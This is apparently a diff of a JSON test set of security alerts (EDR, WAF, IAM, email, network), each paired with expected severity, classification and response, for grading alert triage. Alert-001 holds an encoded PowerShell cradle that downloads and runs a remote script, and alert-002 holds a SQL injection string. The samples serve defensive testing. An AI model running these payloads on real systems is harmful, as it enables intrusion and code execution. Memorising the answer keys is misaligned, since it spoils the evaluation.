@@ -1,49 +1,338 @@
 [
   {
-    "id": "alert-001",
-    "source": "EDR",
-    "raw_payload": {
-      "process": "powershell.exe",
-      "command_line": "powershell -enc JABhAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBqAGUAYwB0AA==",
-      "user": "SYSTEM",
-      "host": "srv-sql-01"
+    "alert": {
+      "id": "alert-001",
+      "source": "EDR",
+      "timestamp": "2026-11-03T02:14:09Z",
+      "title": "Encoded PowerShell launched by SYSTEM on database server",
+      "raw_payload": {
+        "process": "powershell.exe",
+        "command_line": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA0ADUALwBzAHQAYQBnAGUALgBwAHMAMQAnACkA",
+        "user": "SYSTEM",
+        "host": "srv-sql-01"
+      }
     },
-    "expected_eval": {
+    "expected": {
       "severity": "Critical",
-      "classification": "True Positive",
-      "reasoning_contains": ["encoded", "powershell", "suspicious download"],
-      "recommended_action": "Isolate host and investigate memory dump"
+      "classification": "true_positive",
+      "action_type": "isolate_host",
+      "needs_human_review": true,
+      "must_cite_fields": ["command_line", "process"]
     }
   },
   {
-    "id": "alert-002",
-    "source": "WAF",
-    "raw_payload": {
-      "uri": "/api/v1/users?id=1' OR '1'='1",
-      "method": "GET",
-      "status_code": 200,
-      "source_ip": "192.168.1.50"
+    "alert": {
+      "id": "alert-002",
+      "source": "WAF",
+      "timestamp": "2026-11-03T09:41:52Z",
+      "title": "SQL injection pattern in user API query, request succeeded",
+      "raw_payload": {
+        "uri": "/api/v1/users?id=1' OR '1'='1",
+        "method": "GET",
+        "status_code": 200,
+        "source_ip": "198.51.100.23",
+        "user_agent": "sqlmap/1.7"
+      }
     },
-    "expected_eval": {
+    "expected": {
       "severity": "High",
-      "classification": "True Positive",
-      "reasoning_contains": ["SQL injection", "OR '1'='1"],
-      "recommended_action": "Block source IP and review web application logs"
+      "classification": "true_positive",
+      "action_type": "block_ip",
+      "needs_human_review": true,
+      "must_cite_fields": ["uri", "status_code"]
     }
   },
   {
-    "id": "alert-003",
-    "source": "Antivirus",
-    "raw_payload": {
-      "process": "updater.exe",
-      "path": "C:\\Program Files\\Google\\Chrome\\Application\\updater.exe",
-      "action": "modified system file"
+    "alert": {
+      "id": "alert-003",
+      "source": "IAM",
+      "timestamp": "2026-11-04T03:27:30Z",
+      "title": "Successful admin login after burst of failed attempts",
+      "raw_payload": {
+        "account": "it-admin",
+        "failed_attempts": 48,
+        "window_minutes": 10,
+        "result": "success",
+        "source_ip": "203.0.113.88"
+      }
     },
-    "expected_eval": {
+    "expected": {
+      "severity": "High",
+      "classification": "true_positive",
+      "action_type": "reset_credentials",
+      "needs_human_review": true,
+      "must_cite_fields": ["failed_attempts", "source_ip"]
+    }
+  },
+  {
+    "alert": {
+      "id": "alert-004",
+      "source": "Email",
+      "timestamp": "2026-11-04T10:05:18Z",
+      "title": "Employee clicked credential-phishing link from lookalike domain",
+      "raw_payload": {
+        "sender": "support@account-verify.example.com",
+        "subject": "Your mailbox will be suspended today",
+        "url": "https://account-verify.example.com/login",
+        "user_clicked": true,
+        "spf_result": "fail"
+      }
+    },
+    "expected": {
+      "severity": "High",
+      "classification": "true_positive",
+      "action_type": "reset_credentials",
+      "needs_human_review": true,
+      "must_cite_fields": ["url", "user_clicked"]
+    }
+  },
+  {
+    "alert": {
+      "id": "alert-005",
+      "source": "Antivirus",
+      "timestamp": "2026-11-05T14:52:44Z",
+      "title": "Ransomware detected, quarantine failed",
+      "raw_payload": {
+        "detection": "Ransom.Generic.Encrypt",
+        "path": "C:\\Users\\Public\\invoice_2026.exe",
+        "action_taken": "quarantine_failed",
+        "host": "ws-finance-07"
+      }
+    },
+    "expected": {
+      "severity": "Critical",
+      "classification": "true_positive",
+      "action_type": "isolate_host",
+      "needs_human_review": true,
+      "must_cite_fields": ["detection", "action_taken"]
+    }
+  },
+  {
+    "alert": {
+      "id": "alert-006",
+      "source": "Antivirus",
+      "timestamp": "2026-11-05T08:30:11Z",
+      "title": "Browser updater modified a system file",
+      "raw_payload": {
+        "process": "updater.exe",
+        "path": "C:\\Program Files\\ExampleBrowser\\Application\\updater.exe",
+        "action": "modified system file",
+        "signature_status": "valid",
+        "signer": "Example Software Inc."
+      }
+    },
+    "expected": {
       "severity": "Low",
-      "classification": "False Positive",
-      "reasoning_contains": ["legitimate", "Chrome", "updater"],
-      "recommended_action": "Ignore / Close alert"
+      "classification": "false_positive",
+      "action_type": "close",
+      "needs_human_review": false,
+      "must_cite_fields": ["signature_status", "process"]
+    }
+  },
+  {
+    "alert": {
+      "id": "alert-007",
+      "source": "WAF",
+      "timestamp": "2026-11-06T13:18:03Z",
+      "title": "XSS rule triggered on documentation search request",
+      "raw_payload": {
+        "uri": "/docs/search?q=how+to+escape+%3Cscript%3E+tags+in+templates",
+        "method": "GET",
+        "status_code": 403,
+        "rule_id": "xss-001",
+        "source_ip": "10.20.4.17",
+        "referer": "https://docs.example.com/search"
+      }
+    },
+    "expected": {
+      "severity": "Low",
+      "classification": "false_positive",
+      "action_type": "close",
+      "needs_human_review": false,
+      "must_cite_fields": ["uri", "referer"]
+    }
+  },
+  {
+    "alert": {
+      "id": "alert-008",
+      "source": "Network",
+      "timestamp": "2026-11-06T02:05:40Z",
+      "title": "Large outbound transfer from file server",
+      "raw_payload": {
+        "src_host": "fs-backup-01",
+        "dest_host": "backup.example.com",
+        "dest_ip": "198.51.100.40",
+        "bytes_out": 52428800000,
+        "schedule": "nightly 02:00",
+        "destination_approved": true
+      }
+    },
+    "expected": {
+      "severity": "Low",
+      "classification": "false_positive",
+      "action_type": "close",
+      "needs_human_review": false,
+      "must_cite_fields": ["dest_host", "schedule"]
+    }
+  },
+  {
+    "alert": {
+      "id": "alert-009",
+      "source": "EDR",
+      "timestamp": "2026-11-09T01:30:22Z",
+      "title": "Shadow copy listing command executed",
+      "raw_payload": {
+        "process": "vssadmin.exe",
+        "command_line": "vssadmin list shadows",
+        "parent_process": "backup-agent.exe",
+        "user": "svc-backup",
+        "signature_status": "valid",
+        "host": "srv-file-02"
+      }
+    },
+    "expected": {
+      "severity": "Low",
+      "classification": "false_positive",
+      "action_type": "close",
+      "needs_human_review": false,
+      "must_cite_fields": ["command_line", "parent_process"]
+    }
+  },
+  {
+    "alert": {
+      "id": "alert-010",
+      "source": "EDR",
+      "timestamp": "2026-11-10T22:41:07Z",
+      "title": "PsExec remote execution from IT jump host",
+      "raw_payload": {
+        "process": "psexec.exe",
+        "command_line": "psexec \\\\srv-app-04 -s cmd.exe /c ipconfig /all",
+        "source_host": "it-jump-01",
+        "account": "adm-user3",
+        "in_maintenance_window": true,
+        "account_on_change_ticket": false
+      }
+    },
+    "expected": {
+      "severity": "Medium",
+      "classification": "needs_investigation",
+      "action_type": "escalate",
+      "needs_human_review": true,
+      "must_cite_fields": ["in_maintenance_window", "account_on_change_ticket"]
+    }
+  },
+  {
+    "alert": {
+      "id": "alert-011",
+      "source": "IAM",
+      "timestamp": "2026-11-11T03:12:45Z",
+      "title": "Impossible travel between two logins",
+      "raw_payload": {
+        "account": "user-0142",
+        "first_login_location": "Frankfurt",
+        "second_login_location": "Singapore",
+        "minutes_between": 40,
+        "second_login_via_corporate_vpn": true,
+        "device_registered": false
+      }
+    },
+    "expected": {
+      "severity": "Medium",
+      "classification": "needs_investigation",
+      "action_type": "escalate",
+      "needs_human_review": true,
+      "must_cite_fields": ["second_login_via_corporate_vpn", "device_registered"]
+    }
+  },
+  {
+    "alert": {
+      "id": "alert-012",
+      "source": "Network",
+      "timestamp": "2026-11-12T02:10:58Z",
+      "title": "Large upload to personal cloud storage",
+      "raw_payload": {
+        "user": "user-0377",
+        "dest_host": "files.personal-cloud.example.com",
+        "dest_ip": "203.0.113.120",
+        "bytes_out": 8400000000,
+        "user_baseline_upload_mb_per_day": 6500,
+        "dest_category": "personal_cloud_storage"
+      }
+    },
+    "expected": {
+      "severity": "High",
+      "classification": "needs_investigation",
+      "action_type": "escalate",
+      "needs_human_review": true,
+      "must_cite_fields": ["user_baseline_upload_mb_per_day", "dest_category"]
+    }
+  },
+  {
+    "alert": {
+      "id": "alert-013",
+      "source": "Antivirus",
+      "timestamp": "2026-11-13T11:36:29Z",
+      "title": "Unsigned scheduled task created during software install",
+      "raw_payload": {
+        "task_name": "ExampleVendorUpdateCheck",
+        "created_by_process": "setup-vendor.exe",
+        "installer_signature_status": "valid",
+        "task_binary_path": "C:\\Users\\Public\\updchk.exe",
+        "task_binary_signed": false,
+        "host": "ws-sales-12"
+      }
+    },
+    "expected": {
+      "severity": "Medium",
+      "classification": "needs_investigation",
+      "action_type": "escalate",
+      "needs_human_review": true,
+      "must_cite_fields": ["installer_signature_status", "task_binary_signed"]
+    }
+  },
+  {
+    "alert": {
+      "id": "alert-014",
+      "source": "WAF",
+      "timestamp": "2026-11-16T20:22:14Z",
+      "title": "Failed-login burst from internal vulnerability scanner",
+      "raw_payload": {
+        "source_ip": "10.30.0.25",
+        "scanner_registered": true,
+        "target": "hr-portal.example.com",
+        "target_in_scan_scope": false,
+        "failed_logins": 212,
+        "window_minutes": 5
+      }
+    },
+    "expected": {
+      "severity": "Medium",
+      "classification": "needs_investigation",
+      "action_type": "monitor",
+      "needs_human_review": true,
+      "must_cite_fields": ["scanner_registered", "target_in_scan_scope"]
+    }
+  },
+  {
+    "alert": {
+      "id": "alert-015",
+      "source": "Email",
+      "timestamp": "2026-11-17T09:48:36Z",
+      "title": "Macro-enabled document from known vendor domain",
+      "raw_payload": {
+        "sender": "accounts@vendor.example.com",
+        "sender_domain_known": true,
+        "attachment": "Q4-statement.xlsm",
+        "attachment_has_macro": true,
+        "macro_autoexec": true
+      }
+    },
+    "expected": {
+      "severity": "Medium",
+      "classification": "needs_investigation",
+      "action_type": "escalate",
+      "needs_human_review": true,
+      "must_cite_fields": ["sender_domain_known", "macro_autoexec"]
     }
   }
 ]
